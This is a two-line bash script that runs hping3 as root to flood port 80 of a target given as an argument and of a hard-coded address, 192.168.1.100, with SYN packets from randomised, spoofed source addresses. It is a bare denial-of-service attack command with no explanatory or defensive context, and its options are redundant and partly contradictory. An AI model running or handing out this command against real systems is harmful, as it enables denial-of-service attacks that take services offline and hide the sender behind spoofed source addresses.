#!/bin/bash
sudo hping3 -S -p 80 -c 10 -i u100000 "$1" --flood --rand-source -S -p 80 192.168.1.100
